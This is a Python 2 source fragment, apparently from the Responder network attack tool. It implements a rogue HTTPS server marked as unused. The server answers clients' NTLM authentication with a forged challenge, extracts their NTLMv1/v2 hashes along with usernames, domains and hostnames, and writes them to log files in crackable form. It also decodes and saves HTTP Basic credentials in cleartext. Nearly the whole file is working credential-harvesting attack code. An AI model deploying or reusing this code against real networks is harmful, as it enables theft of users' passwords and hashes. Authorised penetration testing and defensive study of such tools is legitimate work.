##################################################################################
#HTTPS Server stuff starts here (Not Used)
##################################################################################

class HTTPSProxy():

	def serve_thread_SSL(host, port, handler):
		try:
			server = SSlSock((host, port), handler)
			server.serve_forever()
		except Exception, e:
			print "Error starting TCP server on port %s: %s:" % (str(port),str(e))

	#Function name self-explanatory
	def start(SSL_On_Off):
		if SSL_On_Off == "ON":
			t = threading.Thread(name="SSL", target=self.serve_thread_SSL, args=("0.0.0.0", 443,DoSSL))        
			t.setDaemon(True)
			t.start()
			return t
		if SSL_On_Off == "OFF":
			return False

class SSlSock(ThreadingMixIn, TCPServer):
	def __init__(self, server_address, RequestHandlerClass):
		BaseServer.__init__(self, server_address, RequestHandlerClass)
		ctx = SSL.Context(SSL.SSLv3_METHOD)
		ctx.use_privatekey_file(SSLkey)
		ctx.use_certificate_file(SSLcert)
		self.socket = SSL.Connection(ctx, socket.socket(self.address_family, self.socket_type))
		self.server_bind()
		self.server_activate()

	def shutdown_request(self,request):
		try:
			request.shutdown()
		except:
			pass

class DoSSL(StreamRequestHandler):
	def setup(self):
		self.exchange = self.request
		self.rfile = socket._fileobject(self.request, "rb", self.rbufsize)
		self.wfile = socket._fileobject(self.request, "wb", self.wbufsize)

	def handle(self):
		try:
			while True:
				data = self.exchange.recv(8092)
				self.exchange.settimeout(0.5)
				buff = WpadCustom(data,self.client_address[0])
				if buff:
					self.exchange.send(buff)
				else:
					buffer0 = HTTPSPacketSequence(data,self.client_address[0])
					self.exchange.send(buffer0)
		except:
			pass

#Parse NTLMv1/v2 hash.
def ParseHTTPSHash(data,client):
	LMhashLen = struct.unpack('<H',data[12:14])[0]
	LMhashOffset = struct.unpack('<H',data[16:18])[0]
	LMHash = data[LMhashOffset:LMhashOffset+LMhashLen].encode("hex").upper()
	NthashLen = struct.unpack('<H',data[20:22])[0]
	NthashOffset = struct.unpack('<H',data[24:26])[0]
	NTHash = data[NthashOffset:NthashOffset+NthashLen].encode("hex").upper()
	if NthashLen == 24:
		#print "[+]HTTPS NTLMv1 hash captured from :",client
		responder_logger.info('[+]HTTPS NTLMv1 hash captured from :%s'%(client))
		NtHash = data[NthashOffset:NthashOffset+NthashLen].encode("hex").upper()
		HostNameLen = struct.unpack('<H',data[46:48])[0]
		HostNameOffset = struct.unpack('<H',data[48:50])[0]
		Hostname = data[HostNameOffset:HostNameOffset+HostNameLen].replace('\x00','')
		#print "Hostname is :", Hostname
		responder_logger.info('[+]HTTPS NTLMv1 Hostname is :%s'%(Hostname))
		UserLen = struct.unpack('<H',data[36:38])[0]
		UserOffset = struct.unpack('<H',data[40:42])[0]
		User = data[UserOffset:UserOffset+UserLen].replace('\x00','')
		#print "User is :", data[UserOffset:UserOffset+UserLen].replace('\x00','')
		responder_logger.info('[+]HTTPS NTLMv1 User is :%s'%(data[UserOffset:UserOffset+UserLen].replace('\x00','')))
		outfile = "./logs/responder/HTTPS-NTLMv1-Client-"+client+".txt"
		WriteHash = User+"::"+Hostname+":"+LMHash+":"+NtHash+":"+NumChal
		WriteData(outfile,WriteHash, User+"::"+Hostname)
		#print "Complete hash is : ", WriteHash
		responder_logger.info('[+]HTTPS NTLMv1 Complete hash is :%s'%(WriteHash))
	if NthashLen > 24:
		#print "[+]HTTPS NTLMv2 hash captured from :",client
		responder_logger.info('[+]HTTPS NTLMv2 hash captured from :%s'%(client))
		NthashLen = 64
		DomainLen = struct.unpack('<H',data[28:30])[0]
		DomainOffset = struct.unpack('<H',data[32:34])[0]
		Domain = data[DomainOffset:DomainOffset+DomainLen].replace('\x00','')
		#print "Domain is : ", Domain
		responder_logger.info('[+]HTTPS NTLMv2 Domain is :%s'%(Domain))
		UserLen = struct.unpack('<H',data[36:38])[0]
		UserOffset = struct.unpack('<H',data[40:42])[0]
		User = data[UserOffset:UserOffset+UserLen].replace('\x00','')
		#print "User is :", User
		responder_logger.info('[+]HTTPS NTLMv2 User is : %s'%(User))
		HostNameLen = struct.unpack('<H',data[44:46])[0]
		HostNameOffset = struct.unpack('<H',data[48:50])[0]
		HostName =  data[HostNameOffset:HostNameOffset+HostNameLen].replace('\x00','')
		#print "Hostname is :", HostName
		responder_logger.info('[+]HTTPS NTLMv2 Hostname is :%s'%(HostName))
		outfile = "./logs/responder/HTTPS-NTLMv2-Client-"+client+".txt"
		WriteHash = User+"::"+Domain+":"+NumChal+":"+NTHash[:32]+":"+NTHash[32:]
		WriteData(outfile,WriteHash, User+"::"+Domain)
		#print "Complete hash is : ", WriteHash
		responder_logger.info('[+]HTTPS NTLMv2 Complete hash is :%s'%(WriteHash))

#Handle HTTPS packet sequence.
def HTTPSPacketSequence(data,client):
	a = re.findall('(?<=Authorization: NTLM )[^\\r]*', data)
	b = re.findall('(?<=Authorization: Basic )[^\\r]*', data)
	if a:
		packetNtlm = b64decode(''.join(a))[8:9]
		if packetNtlm == "\x01":
			GrabCookie(data,client)
			r = NTLM_Challenge(ServerChallenge=Challenge)
			r.calculate()
			t = IIS_NTLM_Challenge_Ans()
			t.calculate(str(r))
			buffer1 = str(t)
			return buffer1
		if packetNtlm == "\x03":
			NTLM_Auth= b64decode(''.join(a))
			ParseHTTPSHash(NTLM_Auth,client)
			buffer1 = str(IIS_Auth_Granted(Payload=HTMLToServe))
			return buffer1
	if b:
		GrabCookie(data,client)
		outfile = "./logs/responder/HTTPS-Clear-Text-Password-"+client+".txt"
		WriteData(outfile,b64decode(''.join(b)), b64decode(''.join(b)))
		#print "[+]HTTPS-User & Password:", b64decode(''.join(b))
		responder_logger.info('[+]HTTPS-User & Password: %s'%(b64decode(''.join(b))))
		buffer1 = str(IIS_Auth_Granted(Payload=HTMLToServe))
		return buffer1

	else:
		return str(Basic_Ntlm(Basic))

##################################################################################
#HTTPS Server stuff ends here (Not Used)
##################################################################################